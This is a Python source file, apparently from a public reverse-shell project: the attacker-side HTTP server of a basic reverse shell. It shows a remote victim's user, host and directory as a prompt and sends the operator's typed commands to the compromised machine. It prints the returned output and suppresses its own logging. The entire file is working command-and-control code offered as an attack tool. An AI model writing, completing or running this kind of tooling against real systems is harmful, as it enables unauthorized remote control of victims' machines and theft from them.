#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Basic-HTTP-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

import re
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import BaseServer
from urllib.parse import parse_qs

from src.server.routes import ServerRoutes


class ShellHandler(BaseHTTPRequestHandler):
    def __init__(self,
                 request: bytes,
                 client_address: [str, int],
                 server: BaseServer):
        self.routes = ServerRoutes(self)
        self.route = None
        self.subpath = None
        self.data = None
        super().__init__(request, client_address, server)

    @property
    def shell_prompt(self):
        user, host, pwd = self.headers.get("X-Shell-Prompt").split(";")
        return f"{user}@{host}:{pwd}$ "

    def do_GET(self):
        try:
            response = input(self.shell_prompt)
        except EOFError:
            raise KeyboardInterrupt
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(response.encode())

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        self.data = parse_qs(self.rfile.read(length).decode())
        self.route, self.subpath = self._split_path()
        try:
            getattr(self.routes, self.route)()
        except AttributeError:
            print(*self.data.get("contents", ""), end="")
        self.send_response(200)
        self.end_headers()

    def _split_path(self):
        split_path = re.match(r"/(.*)/(.*)$", self.path)
        return "webroot", "" if split_path is None else split_path.groups()

    def log_message(self, *args, **kwargs):
        """Suppress sending of log messages to STDOUT."""
        pass


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description="Basic HTTP Reverse Shell Server")
    parser.add_argument("host",
                        type=str,
                        help="Server address or hostname.")
    parser.add_argument("-p", "--port",
                        type=int,
                        default=8080,
                        help="Port number to bind the server to.")
    _args = parser.parse_args()

    server_sock = _args.host, _args.port

    with HTTPServer(server_sock, ShellHandler) as http_server:
        try:
            print('[>>>] Server started on http://{}:{}'.format(*server_sock))
            http_server.serve_forever()
        except KeyboardInterrupt:
            print('\n[!] Shutting down the server...')
